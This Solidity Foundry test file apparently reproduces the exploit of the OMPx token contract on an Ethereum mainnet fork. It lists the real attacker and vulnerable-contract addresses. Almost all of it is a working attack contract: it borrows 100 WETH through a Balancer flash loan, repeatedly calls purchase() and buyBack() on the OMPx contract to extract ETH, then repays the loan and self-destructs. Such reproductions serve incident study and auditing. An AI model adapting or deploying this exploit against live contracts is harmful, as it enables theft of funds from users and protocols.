// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.37 ETH (~11527 USD)
// Attacker : https://etherscan.io/address/0x40d115198d71cab59668b51dd112a07d273d5831
// Attack Contract : https://etherscan.io/address/0xfaddf57d079b01e53d1fe3476cc83e9bcc705854
// Vulnerable Contract : https://etherscan.io/address/0x09a80172ed7335660327cd664876b5df6fe06108
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xd927843e30c6b2bf43103d83bca6abead648eac3cad0d05b1b0eb84cd87de9b6?line=0

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x09a80172ed7335660327cd664876b5df6fe06108#code

// @Analysis
 

// Contracts involved
address constant OMPxContract = 0x09A80172ED7335660327cD664876b5df6FE06108;
address constant OMPX = 0x633B041C41f61D04089880D7B5C7ED0F10fF6f85;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

contract OMPxContract_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 20_468_780 - 1);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", attacker.balance, 18);

        AttackerC attackerC = new AttackerC();
        attackerC.attack();

        emit log_named_decimal_uint("[End] Attacker ETH balance after exploit", attacker.balance, 18);

        vm.stopPrank();
    }
}

contract AttackerC {
    IBalancerVault Balancer = IBalancerVault(BalancerVault);

    function attack() public {
        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        Balancer.flashLoan(
            address(this),
            tokens,
            amounts,
            // ???
            "0x00000000000000000000000009a80172ed7335660327cd664876b5df6fe06108000000000000000000000000633b041c41f61d04089880d7b5c7ed0f10ff6f850000000000000000000000000000000000000000000000056bc75e2d63100000"
        );

        selfdestruct(payable(msg.sender));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address w = tokens[0]; // WETH

        IWETH(payable(w)).withdraw(amounts[0]);

        for (int256 i = 0; i < 7; i++) {
            // console.log("balanceOf OMPX: ", IERC20(OMPX).balanceOf(OMPxContract));
            IOMPxContract(OMPxContract).purchase{value: 100 ether}(
                IERC20(OMPX).balanceOf(OMPxContract), 10_000_000_000_000
            );

            // console.log("balanceOf OMPX: ", IERC20(OMPX).balanceOf(address(this)));
            IOMPxContract(OMPxContract).buyBack(IERC20(OMPX).balanceOf(address(this)), 1);
        }

        // console.log("balance ", address(this).balance);
        IWETH(payable(w)).deposit{value: address(this).balance}();

        // Return loan
        // console.log("balanceOf WETH: ", IERC20(weth).balanceOf(address(this)));
        IWETH(payable(w)).transfer(BalancerVault, amounts[0] + feeAmounts[0]);
        // console.log("balanceOf WETH: ", IERC20(weth).balanceOf(address(this)));

        IWETH(payable(w)).withdraw(IERC20(weth).balanceOf(address(this)));
    }

    fallback() external payable {}
}

interface IOMPxContract {
    // Purchase tokens to user.
    // Money back should happens if current price is lower, then expected
    function purchase(uint256 tokensToPurchase, uint256 maxPrice) external payable returns (uint256 tokensBought_);

    // buyback tokens from user
    function buyBack(uint256 tokensToBuyBack, uint256 minPrice) external;
}
